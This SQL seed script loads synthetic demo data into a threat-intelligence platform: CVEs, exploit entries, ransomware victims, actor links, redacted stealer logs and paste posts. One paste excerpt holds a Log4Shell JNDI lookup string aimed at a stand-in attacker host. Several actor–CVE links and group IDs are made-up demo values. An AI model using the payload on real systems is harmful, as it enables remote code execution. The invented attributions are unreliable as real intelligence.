-- ================================================
-- IntelForge - Demo Seed for Deep Correlation
-- ------------------------------------------------
-- Adds realistic, *synthetic* CTI artifacts so the
-- correlator has rich data to chew on for demos:
--
--   • Headline CVEs that everybody knows
--   • Threat-actor → CVE → victim chains
--   • Pastebin posts referencing those CVEs
--   • Stealer logs with redacted credentials
--   • Combolist drops with sample domains
--   • Compromised hosts
--
-- All passwords / personal data are placeholders only.
-- Idempotent: ON CONFLICT DO NOTHING / DO UPDATE.
-- ================================================

-- ---- Reference CVEs (well-known, easy to demo) ----
INSERT INTO intel_cve_cache
  (cve_id, description, cvss_v3_score, cvss_v3_severity, epss_score, is_kev, vendor, product, published_at, last_modified)
VALUES
  ('CVE-2023-34362', 'Progress MOVEit Transfer SQL injection allows unauth attackers to access the database. Exploited in mass extortion by Cl0p.', 9.8, 'CRITICAL', 0.97, true, 'Progress', 'MOVEit Transfer', NOW() - INTERVAL '60 days', NOW()),
  ('CVE-2021-44228', 'Apache Log4j2 JNDI features in configuration, log messages, and parameters do not protect against attacker-controlled LDAP. Aka Log4Shell.', 10.0, 'CRITICAL', 0.95, true, 'Apache', 'Log4j', NOW() - INTERVAL '120 days', NOW()),
  ('CVE-2024-3094', 'XZ Utils backdoor in liblzma allowing remote SSH authentication bypass on systemd-linked sshd.', 10.0, 'CRITICAL', 0.92, true, 'XZ', 'liblzma', NOW() - INTERVAL '40 days', NOW()),
  ('CVE-2023-4966', 'Citrix NetScaler ADC and NetScaler Gateway sensitive information disclosure. Aka CitrixBleed.', 9.4, 'CRITICAL', 0.94, true, 'Citrix', 'NetScaler', NOW() - INTERVAL '70 days', NOW()),
  ('CVE-2024-21887', 'Ivanti Connect Secure command injection in web components. Exploited by espionage actors.', 9.1, 'CRITICAL', 0.88, true, 'Ivanti', 'Connect Secure', NOW() - INTERVAL '30 days', NOW()),
  ('CVE-2022-30190', 'Microsoft Windows Support Diagnostic Tool remote code execution. Aka Follina.', 7.8, 'HIGH', 0.85, true, 'Microsoft', 'MSDT', NOW() - INTERVAL '90 days', NOW()),
  ('CVE-2021-34527', 'Windows Print Spooler privilege escalation. Aka PrintNightmare.', 8.8, 'HIGH', 0.91, true, 'Microsoft', 'Print Spooler', NOW() - INTERVAL '110 days', NOW())
ON CONFLICT (cve_id) DO UPDATE SET
  description = EXCLUDED.description,
  cvss_v3_score = EXCLUDED.cvss_v3_score,
  cvss_v3_severity = EXCLUDED.cvss_v3_severity,
  epss_score = EXCLUDED.epss_score,
  is_kev = EXCLUDED.is_kev,
  vendor = EXCLUDED.vendor,
  product = EXCLUDED.product;


-- ---- Public exploits for those CVEs ----
INSERT INTO intel_exploit_cache
  (exploit_id, cve_id, title, description, exploit_type, platform, published_at, verified, has_poc)
VALUES
  ('DEMO-EDB-50001', 'CVE-2023-34362', 'MOVEit Transfer SQLi unauth — file lister PoC', 'Auth-bypass + SQLi against /human2.aspx', 'webapp', 'multiple', NOW() - INTERVAL '55 days', true, true),
  ('DEMO-EDB-50002', 'CVE-2021-44228', 'Apache Log4j RCE — JNDI/LDAP JndiManager', 'Triggers via crafted log line', 'remote', 'java', NOW() - INTERVAL '118 days', true, true),
  ('DEMO-EDB-50003', 'CVE-2024-3094', 'XZ Utils backdoor proof-of-concept harness', 'Demonstrates auth bypass on patched openssh-server', 'remote', 'linux', NOW() - INTERVAL '38 days', true, true),
  ('DEMO-EDB-50004', 'CVE-2023-4966', 'CitrixBleed memory disclosure exploit', 'Leaks session tokens from NetScaler appliance', 'remote', 'multiple', NOW() - INTERVAL '65 days', true, true),
  ('DEMO-EDB-50005', 'CVE-2024-21887', 'Ivanti Connect Secure RCE chain', 'Combines CVE-2024-21887 with auth-bypass', 'remote', 'multiple', NOW() - INTERVAL '28 days', true, true),
  ('DEMO-EDB-50006', 'CVE-2022-30190', 'msdt:// Office macro PoC', 'Drops second-stage payload', 'local', 'windows', NOW() - INTERVAL '85 days', true, true)
ON CONFLICT (exploit_id) DO UPDATE SET
  cve_id = EXCLUDED.cve_id,
  title = EXCLUDED.title;

-- ---- News articles referencing CVE IDs and aliases ----
INSERT INTO intel_news_cache
  (guid, title, description, url, source, source_label, category, published_at)
VALUES
  ('demo-news-001', 'Mass exploitation of MOVEit Transfer continues — CVE-2023-34362 victim list grows', 'Hundreds of organisations confirm data theft via MOVEit. Cl0p ransomware claims responsibility.', 'https://example.invalid/demo/news/001', 'demo-feed', 'Demo Feed', 'breach', NOW() - INTERVAL '5 days'),
  ('demo-news-002', 'Log4Shell still in the wild three years later — CVE-2021-44228 detections rise', 'Threat hunters report renewed scanning for Log4j after a fresh PoC dropped on a paste site.', 'https://example.invalid/demo/news/002', 'demo-feed', 'Demo Feed', 'vulnerability', NOW() - INTERVAL '3 days'),
  ('demo-news-003', 'XZ Utils backdoor: timeline of the supply-chain attack', 'How CVE-2024-3094 was caught hours before mass distribution.', 'https://example.invalid/demo/news/003', 'demo-feed', 'Demo Feed', 'malware', NOW() - INTERVAL '4 days'),
  ('demo-news-004', 'CitrixBleed exploitation tied to LockBit affiliates', 'CVE-2023-4966 used to seed initial access at multiple healthcare providers.', 'https://example.invalid/demo/news/004', 'demo-feed', 'Demo Feed', 'ransomware', NOW() - INTERVAL '6 days'),
  ('demo-news-005', 'Ivanti VPN appliances under active espionage attack', 'CVE-2024-21887 abused alongside CVE-2023-46805 by suspected nation-state actors.', 'https://example.invalid/demo/news/005', 'demo-feed', 'Demo Feed', 'apt', NOW() - INTERVAL '2 days'),
  ('demo-news-006', 'Follina returns: campaigns abusing msdt scheme spike again', 'CVE-2022-30190 weaponised in Office attachments targeting eastern European telecoms.', 'https://example.invalid/demo/news/006', 'demo-feed', 'Demo Feed', 'apt', NOW() - INTERVAL '7 days'),
  ('demo-news-007', 'Cl0p adds three new victims to leak site this week', 'Manufacturing and finance sectors most affected in the latest extortion wave.', 'https://example.invalid/demo/news/007', 'demo-feed', 'Demo Feed', 'ransomware', NOW() - INTERVAL '1 days'),
  ('demo-news-008', 'LockBit 4.0 affiliate panel surfaces on dark web', 'Operators advertise renewed services after law-enforcement disruption.', 'https://example.invalid/demo/news/008', 'demo-feed', 'Demo Feed', 'ransomware', NOW() - INTERVAL '4 days'),
  ('demo-news-009', 'PrintNightmare proof-of-concept wave on paste sites', 'Renewed PoC drops for CVE-2021-34527 across pastebin clones.', 'https://example.invalid/demo/news/009', 'demo-feed', 'Demo Feed', 'vulnerability', NOW() - INTERVAL '8 days')
ON CONFLICT (guid) DO UPDATE SET title = EXCLUDED.title, description = EXCLUDED.description;


-- ---- Ransomware groups + victims (chain anchor) ----
INSERT INTO intel_ransomware_groups
  (slug, name, description, first_seen, victim_count, active, locations, sectors, aliases)
VALUES
  ('cl0p', 'Cl0p', 'Russian-speaking ransomware-as-a-service crew known for MOVEit mass exploitation.', '2019-02-01', 600, true, ARRAY['Russia']::text[], ARRAY['Manufacturing','Finance','Healthcare','Education']::text[], ARRAY['CL0P','TA505 affiliate']::text[]),
  ('lockbit', 'LockBit', 'High-volume RaaS programme reconstituted after February 2024 takedown.', '2019-09-01', 1700, true, ARRAY['Russia']::text[], ARRAY['Healthcare','Government','Manufacturing','Construction']::text[], ARRAY['LockBit 3.0','LockBit Black','LockBit 4.0']::text[]),
  ('blackcat', 'BlackCat', 'Rust-based RaaS aka ALPHV. Affiliate-driven extortion.', '2021-11-01', 800, false, ARRAY['Russia']::text[], ARRAY['Healthcare','Energy','Education']::text[], ARRAY['ALPHV','Noberus']::text[]),
  ('akira', 'Akira', 'Conti-affiliated double-extortion crew targeting VPN appliances.', '2023-03-01', 350, true, ARRAY['Russia']::text[], ARRAY['Manufacturing','Finance','Legal']::text[], ARRAY['Akira']::text[])
ON CONFLICT (slug) DO UPDATE SET
  description = EXCLUDED.description,
  victim_count = EXCLUDED.victim_count,
  active = EXCLUDED.active,
  locations = EXCLUDED.locations,
  sectors = EXCLUDED.sectors,
  aliases = EXCLUDED.aliases;

INSERT INTO intel_ransomware_victims
  (victim_name, group_name, discovered_at, country, sector, description)
VALUES
  ('demo-manufacturing-corp', 'cl0p', NOW() - INTERVAL '6 days', 'United States', 'Manufacturing', 'Listed on Cl0p leak site after MOVEit exploitation.'),
  ('demo-bank-northern',     'cl0p', NOW() - INTERVAL '4 days', 'Germany',       'Finance',       'Cl0p-claimed; data tranche of approx 12GB.'),
  ('demo-edu-state-college', 'cl0p', NOW() - INTERVAL '7 days', 'United States', 'Education',     'Student records allegedly exposed.'),
  ('demo-health-network',    'lockbit', NOW() - INTERVAL '3 days', 'United Kingdom', 'Healthcare', 'NHS-style provider listed on LockBit blog.'),
  ('demo-citycouncil',       'lockbit', NOW() - INTERVAL '8 days', 'France',     'Government',    'Municipal services impacted.'),
  ('demo-mfg-precision',     'lockbit', NOW() - INTERVAL '2 days', 'Italy',      'Manufacturing', 'Precision-parts maker, OT impact suspected.'),
  ('demo-legal-firm-aa',     'akira',   NOW() - INTERVAL '1 days', 'Australia',  'Legal',         'Akira double-extortion notice.'),
  ('demo-energy-grid-x',     'blackcat', NOW() - INTERVAL '12 days','Canada',    'Energy',        'BlackCat affiliate listing prior to takedown.')
ON CONFLICT DO NOTHING;


-- ---- MITRE actor groups with aliases ----
INSERT INTO intel_mitre_groups
  (stix_id, name, group_id, aliases, description, sectors, countries)
VALUES
  ('demo-actor-cl0p', 'Cl0p', 'G0900', ARRAY['CL0P','TA505 affiliate']::text[], 'Russian-speaking RaaS affiliate behind MOVEit campaign.', ARRAY['Manufacturing','Finance','Education']::text[], ARRAY['United States','Germany']::text[]),
  ('demo-actor-lockbit', 'LockBit', 'G0901', ARRAY['LockBit 3.0','LockBit Black','LockBit 4.0']::text[], 'High-volume RaaS programme, post-takedown rebuilt.', ARRAY['Healthcare','Government','Manufacturing']::text[], ARRAY['United Kingdom','France','Italy']::text[]),
  ('demo-actor-fancybear', 'APT28', 'G0007', ARRAY['Fancy Bear','Sofacy','STRONTIUM']::text[], 'Russian state-sponsored group; opportunistic Follina exploiter.', ARRAY['Government','Defense','Telecom']::text[], ARRAY['Ukraine','Poland']::text[]),
  ('demo-actor-mustangpanda', 'Mustang Panda', 'G0902', ARRAY['Bronze President','Camaro Dragon']::text[], 'PRC-aligned espionage operator; Ivanti VPN exploiter.', ARRAY['Government','NGO','Telecom']::text[], ARRAY['United States','Europe']::text[])
ON CONFLICT (stix_id) DO UPDATE SET
  name = EXCLUDED.name,
  aliases = EXCLUDED.aliases,
  description = EXCLUDED.description;

-- ---- Threat-actor → CVE explicit edges ----
INSERT INTO intel_actor_cve_links
  (actor_name, cve_id, relationship, confidence, first_seen, last_seen, sources)
VALUES
  ('Cl0p',         'CVE-2023-34362', 'exploits',   95, '2023-05-27', '2024-12-01', ARRAY['demo-feed']::text[]),
  ('Cl0p',         'CVE-2021-44228', 'exploits',   75, '2021-12-15', '2023-08-01', ARRAY['demo-feed']::text[]),
  ('LockBit',      'CVE-2023-4966',  'exploits',   90, '2023-10-15', '2024-09-01', ARRAY['demo-feed']::text[]),
  ('LockBit',      'CVE-2021-34527', 'exploits',   70, '2021-08-01', '2023-02-01', ARRAY['demo-feed']::text[]),
  ('LockBit',      'CVE-2022-30190', 'exploits',   65, '2022-07-01', '2023-04-01', ARRAY['demo-feed']::text[]),
  ('APT28',        'CVE-2022-30190', 'exploits',   85, '2022-06-10', '2024-01-01', ARRAY['demo-feed']::text[]),
  ('Mustang Panda','CVE-2024-21887', 'exploits',   80, '2024-01-15', '2025-02-01', ARRAY['demo-feed']::text[]),
  ('Akira',        'CVE-2023-4966',  'exploits',   78, '2023-12-01', '2024-11-01', ARRAY['demo-feed']::text[])
ON CONFLICT (actor_name, cve_id, relationship) DO UPDATE SET
  confidence = EXCLUDED.confidence,
  last_seen = EXCLUDED.last_seen;

-- ---- Threat-actor → breach edges (cross-reference to victims above) ----
INSERT INTO intel_actor_breach_links
  (actor_name, victim_name, sector, country, breach_date, breach_type, record_count, confidence, severity, references_urls)
VALUES
  ('Cl0p',    'demo-manufacturing-corp', 'Manufacturing', 'United States',  CURRENT_DATE - 6,  'data_leak',   2_500_000, 95, 'critical', ARRAY['https://example.invalid/demo/news/001']::text[]),
  ('Cl0p',    'demo-bank-northern',      'Finance',       'Germany',        CURRENT_DATE - 4,  'data_leak',   8_700_000, 95, 'critical', ARRAY['https://example.invalid/demo/news/007']::text[]),
  ('Cl0p',    'demo-edu-state-college',  'Education',     'United States',  CURRENT_DATE - 7,  'data_leak',   180_000,   85, 'high',     ARRAY['https://example.invalid/demo/news/001']::text[]),
  ('LockBit', 'demo-health-network',     'Healthcare',    'United Kingdom', CURRENT_DATE - 3,  'ransomware',  1_200_000, 92, 'critical', ARRAY['https://example.invalid/demo/news/004']::text[]),
  ('LockBit', 'demo-citycouncil',        'Government',    'France',         CURRENT_DATE - 8,  'ransomware',  450_000,   80, 'high',     ARRAY['https://example.invalid/demo/news/008']::text[]),
  ('LockBit', 'demo-mfg-precision',      'Manufacturing', 'Italy',          CURRENT_DATE - 2,  'extortion',   90_000,    78, 'high',     ARRAY['https://example.invalid/demo/news/008']::text[]),
  ('Akira',   'demo-legal-firm-aa',      'Legal',         'Australia',      CURRENT_DATE - 1,  'extortion',   60_000,    80, 'high',     ARRAY['https://example.invalid/demo/news/004']::text[]),
  ('BlackCat','demo-energy-grid-x',      'Energy',        'Canada',         CURRENT_DATE - 12, 'data_leak',   320_000,   75, 'high',     ARRAY[]::text[])
ON CONFLICT (actor_name, victim_name, breach_date) DO UPDATE SET
  record_count = EXCLUDED.record_count,
  confidence = EXCLUDED.confidence;


-- ---- Pastebin-style posts (some reference CVEs, some leak excerpts) ----
INSERT INTO intel_paste_posts
  (post_uid, source, title, excerpt, indicator_kinds, matched_brands, matched_cves, threat_actor, severity, discovered_at)
VALUES
  ('demo-paste-001', 'pastebin', 'MOVEit Transfer victim list — fresh dump', '<<redacted excerpt>> companies impacted by CVE-2023-34362, full table of victims attached as separate paste.', ARRAY['victim_list']::text[], ARRAY['MOVEit']::text[], ARRAY['CVE-2023-34362']::text[], 'Cl0p', 'critical', NOW() - INTERVAL '5 days'),
  ('demo-paste-002', 'pastebin', 'log4j JNDI exploit one-liner', '${jndi:ldap://attacker.invalid/<<redacted>>} — works against unpatched stacks.', ARRAY['exploit_payload']::text[], ARRAY['Log4j','Apache']::text[], ARRAY['CVE-2021-44228']::text[], NULL, 'high', NOW() - INTERVAL '3 days'),
  ('demo-paste-003', 'ghostbin', 'CitrixBleed token grabber notes', 'Working approach against NetScaler appliances; pulls session cookies via CVE-2023-4966.', ARRAY['exploit_payload','credential']::text[], ARRAY['Citrix','NetScaler']::text[], ARRAY['CVE-2023-4966']::text[], 'LockBit', 'critical', NOW() - INTERVAL '6 days'),
  ('demo-paste-004', 'rentry', 'Follina msdt:// payload + Office attachment', 'Self-contained docx that triggers msdt scheme on open. Patched by KB????.', ARRAY['exploit_payload']::text[], ARRAY['Microsoft Office','MSDT']::text[], ARRAY['CVE-2022-30190']::text[], 'APT28', 'high', NOW() - INTERVAL '7 days'),
  ('demo-paste-005', 'pastebin', 'Ivanti Connect Secure auth-bypass POC', 'Demonstrates CVE-2024-21887 chained with CVE-2023-46805. Full request below.', ARRAY['exploit_payload']::text[], ARRAY['Ivanti','Connect Secure']::text[], ARRAY['CVE-2024-21887']::text[], 'Mustang Panda', 'critical', NOW() - INTERVAL '2 days'),
  ('demo-paste-006', 'pastebin', 'Combolist sample — fortune-500 mix', 'mailbox.example.invalid:<<REDACTED>> — 1.8M lines available on request.', ARRAY['credential','combolist']::text[], ARRAY['Fortune 500']::text[], ARRAY[]::text[], NULL, 'high', NOW() - INTERVAL '4 days'),
  ('demo-paste-007', 'pastebin', 'XZ backdoor analysis dump', 'Reverse engineering notes on liblzma CVE-2024-3094 trigger condition.', ARRAY['analysis']::text[], ARRAY['XZ','OpenSSH']::text[], ARRAY['CVE-2024-3094']::text[], NULL, 'medium', NOW() - INTERVAL '4 days'),
  ('demo-paste-008', 'gist', 'Sample Cl0p ransom note text', 'Boilerplate negotiation page text linked from leak site.', ARRAY['ransom_note']::text[], ARRAY['Cl0p']::text[], ARRAY[]::text[], 'Cl0p', 'high', NOW() - INTERVAL '5 days'),
  ('demo-paste-009', 'rentry', 'PrintNightmare PoC update', 'Updated PowerShell payload chained with CVE-2021-34527.', ARRAY['exploit_payload']::text[], ARRAY['Microsoft','Print Spooler']::text[], ARRAY['CVE-2021-34527']::text[], 'LockBit', 'high', NOW() - INTERVAL '8 days')
ON CONFLICT (post_uid) DO UPDATE SET
  excerpt = EXCLUDED.excerpt,
  matched_cves = EXCLUDED.matched_cves,
  threat_actor = EXCLUDED.threat_actor;


-- ---- Stealer logs (URL · login · password redacted) ----
-- All passwords stored as <REDACTED:<length>> placeholders.
INSERT INTO intel_stealer_logs
  (log_uid, stealer_family, machine_id, country, captured_url, domain, login_user, password_redacted, record_type, captured_at)
VALUES
  ('demo-log-0001', 'redline', 'host-a1b2c3', 'United States',  'https://accounts.examplebank.invalid/login', 'examplebank.invalid', 'j****@example.invalid', '<REDACTED:11>', 'credential', NOW() - INTERVAL '6 days'),
  ('demo-log-0002', 'redline', 'host-a1b2c3', 'United States',  'https://portal.examplebank.invalid/access', 'examplebank.invalid', 'r****@example.invalid', '<REDACTED:9>',  'credential', NOW() - INTERVAL '6 days'),
  ('demo-log-0003', 'lumma',   'host-d4e5f6', 'United Kingdom', 'https://shop.demoretail.invalid/checkout',   'demoretail.invalid', 'k****@example.invalid', '<REDACTED:14>', 'credential', NOW() - INTERVAL '4 days'),
  ('demo-log-0004', 'lumma',   'host-d4e5f6', 'United Kingdom', 'https://aws.amazonaws.invalid/console',      'amazonaws.invalid',  'l****@example.invalid', '<REDACTED:16>', 'credential', NOW() - INTERVAL '4 days'),
  ('demo-log-0005', 'raccoon', 'host-78ghij', 'Germany',        'https://mail.demohealth.invalid/login',     'demohealth.invalid', 'd****@example.invalid', '<REDACTED:10>', 'credential', NOW() - INTERVAL '3 days'),
  ('demo-log-0006', 'raccoon', 'host-78ghij', 'Germany',        'https://citrix-vpn.demohealth.invalid/',     'demohealth.invalid', 'm****@example.invalid', '<REDACTED:13>', 'credential', NOW() - INTERVAL '3 days'),
  ('demo-log-0007', 'vidar',   'host-klmn09', 'France',         'https://owa.democity.invalid/login',         'democity.invalid',   'o****@example.invalid', '<REDACTED:12>', 'credential', NOW() - INTERVAL '7 days'),
  ('demo-log-0008', 'vidar',   'host-klmn09', 'France',         'https://vpn.democity.invalid/portal',        'democity.invalid',   'p****@example.invalid', '<REDACTED:15>', 'credential', NOW() - INTERVAL '7 days'),
  ('demo-log-0009', 'meta',    'host-zxc987', 'Italy',          'https://intranet.demomfg.invalid/auth',      'demomfg.invalid',    'q****@example.invalid', '<REDACTED:11>', 'credential', NOW() - INTERVAL '2 days'),
  ('demo-log-0010', 'meta',    'host-zxc987', 'Italy',          'https://erp.demomfg.invalid/sap',            'demomfg.invalid',    's****@example.invalid', '<REDACTED:18>', 'credential', NOW() - INTERVAL '2 days'),
  ('demo-log-0011', 'redline', 'host-uvw321', 'Australia',      'https://billing.legalcorp.invalid/portal',   'legalcorp.invalid',  't****@example.invalid', '<REDACTED:9>',  'credential', NOW() - INTERVAL '1 days'),
  ('demo-log-0012', 'redline', 'host-uvw321', 'Australia',      'https://drive.legalcorp.invalid/share',      'legalcorp.invalid',  'u****@example.invalid', '<REDACTED:12>', 'credential', NOW() - INTERVAL '1 days')
ON CONFLICT (log_uid) DO UPDATE SET
  captured_at = EXCLUDED.captured_at;

-- ---- Compromised hosts (one row per machine_id we just used) ----
INSERT INTO intel_compromised_hosts
  (host_uid, hostname, country, os, stealer_family, credential_count, cookie_count, autofill_count, matched_domains, first_seen, last_seen, severity)
VALUES
  ('host-a1b2c3', 'DESKTOP-A****Z', 'United States',  'Windows 10', 'redline', 47, 312, 18, ARRAY['examplebank.invalid','githubusercontent.invalid']::text[], NOW() - INTERVAL '6 days', NOW() - INTERVAL '5 days', 'critical'),
  ('host-d4e5f6', 'LAPTOP-D****X', 'United Kingdom', 'Windows 11', 'lumma',   62, 180, 22, ARRAY['demoretail.invalid','amazonaws.invalid']::text[], NOW() - INTERVAL '4 days', NOW() - INTERVAL '4 days', 'critical'),
  ('host-78ghij', 'PC-78****J',    'Germany',        'Windows 10', 'raccoon', 38, 240, 12, ARRAY['demohealth.invalid']::text[], NOW() - INTERVAL '3 days', NOW() - INTERVAL '3 days', 'high'),
  ('host-klmn09', 'WS-KL****9',    'France',         'Windows 11', 'vidar',   55, 290, 19, ARRAY['democity.invalid']::text[], NOW() - INTERVAL '7 days', NOW() - INTERVAL '6 days', 'high'),
  ('host-zxc987', 'OPS-ZX****7',   'Italy',          'Windows 10', 'meta',    71, 410, 27, ARRAY['demomfg.invalid']::text[], NOW() - INTERVAL '2 days', NOW() - INTERVAL '2 days', 'critical'),
  ('host-uvw321', 'LAW-UV****1',   'Australia',      'Windows 11', 'redline', 33, 198, 14, ARRAY['legalcorp.invalid']::text[], NOW() - INTERVAL '1 days', NOW() - INTERVAL '1 days', 'high')
ON CONFLICT (host_uid) DO UPDATE SET
  credential_count = EXCLUDED.credential_count,
  last_seen = EXCLUDED.last_seen;


-- ---- Combolist drops (anonymised summaries only) ----
INSERT INTO intel_combolist_drops
  (drop_uid, name, source, line_count, unique_domains, sample_domains, matched_brands, severity, threat_actor, posted_at, metadata)
VALUES
  ('demo-combo-001', 'Telegram drop · "Fortune-500 mix v3"', 'telegram', 1_812_445, 8740,
    ARRAY['gmail.invalid','outlook.invalid','yahoo.invalid','examplebank.invalid','demohealth.invalid']::text[],
    ARRAY['ExampleBank','DemoHealth']::text[],
    'high', NULL, NOW() - INTERVAL '5 days',
    '{"format":"URL:USER:PASS","redaction":"summary-only"}'::jsonb),
  ('demo-combo-002', 'Forum post · "Healthcare priv combos"', 'forum', 320_001, 1240,
    ARRAY['demohealth.invalid','citrix-vpn.demohealth.invalid','mail.demohealth.invalid']::text[],
    ARRAY['DemoHealth']::text[],
    'critical', 'LockBit', NOW() - INTERVAL '3 days',
    '{"format":"USER:PASS","redaction":"summary-only"}'::jsonb),
  ('demo-combo-003', 'Telegram drop · "EU gov mix"', 'telegram', 410_700, 2200,
    ARRAY['democity.invalid','gov.invalid','mail.gov.invalid']::text[],
    ARRAY['DemoCity Gov']::text[],
    'high', NULL, NOW() - INTERVAL '7 days',
    '{}'::jsonb),
  ('demo-combo-004', 'Breach repost · "Manufacturing exec set"', 'breach', 11_540, 110,
    ARRAY['demomfg.invalid','erp.demomfg.invalid']::text[],
    ARRAY['DemoMfg']::text[],
    'critical', 'LockBit', NOW() - INTERVAL '2 days',
    '{}'::jsonb),
  ('demo-combo-005', 'Pastebin combo · "AU legal firms"', 'forum', 8_300, 70,
    ARRAY['legalcorp.invalid']::text[],
    ARRAY['LegalCorp AU']::text[],
    'high', 'Akira', NOW() - INTERVAL '1 days',
    '{}'::jsonb)
ON CONFLICT (drop_uid) DO UPDATE SET
  line_count = EXCLUDED.line_count,
  posted_at = EXCLUDED.posted_at;

-- ---- Darknet posts that reference our actors / CVEs ----
INSERT INTO intel_darknet_posts
  (post_uid, source, source_type, title, content, threat_actor, victim_name, victim_sector, victim_country, leak_type, severity, discovered_at)
VALUES
  ('demo-dark-001', 'cl0p_blog',  'ransomware_blog', 'Cl0p adds demo-manufacturing-corp', 'New victim posted on Cl0p shame board after MOVEit exploitation chain.', 'Cl0p',    'demo-manufacturing-corp', 'Manufacturing', 'United States',  'data_leak',  'critical', NOW() - INTERVAL '6 days'),
  ('demo-dark-002', 'cl0p_blog',  'ransomware_blog', 'Cl0p adds demo-bank-northern',      'Negotiation deadline disclosed.',                                              'Cl0p',    'demo-bank-northern',      'Finance',       'Germany',        'data_leak',  'critical', NOW() - INTERVAL '4 days'),
  ('demo-dark-003', 'lockbit_blog','ransomware_blog','LockBit claim: demo-health-network','Healthcare provider listed; 1.2M records named.',                              'LockBit', 'demo-health-network',     'Healthcare',    'United Kingdom', 'ransomware', 'critical', NOW() - INTERVAL '3 days'),
  ('demo-dark-004', 'lockbit_blog','ransomware_blog','LockBit claim: demo-citycouncil',  'Local government services listed.',                                            'LockBit', 'demo-citycouncil',        'Government',    'France',         'ransomware', 'high',     NOW() - INTERVAL '8 days'),
  ('demo-dark-005', 'akira_blog', 'ransomware_blog','Akira posts demo-legal-firm-aa',    'Sample documents teaser; 60GB threatened.',                                    'Akira',   'demo-legal-firm-aa',      'Legal',         'Australia',      'extortion',  'high',     NOW() - INTERVAL '1 days'),
  ('demo-dark-006', 'forum_x',    'forum',          'Selling Ivanti VPN initial access',   'Working CVE-2024-21887 chain, EU healthcare and gov in scope.',              'Mustang Panda','demo-citycouncil',  'Government',    'France',         'auction',    'high',     NOW() - INTERVAL '2 days')
ON CONFLICT (post_uid) DO UPDATE SET
  content = EXCLUDED.content,
  victim_name = EXCLUDED.victim_name;

-- ---- Refresh derived view ----
REFRESH MATERIALIZED VIEW mv_geo_threat_30d;
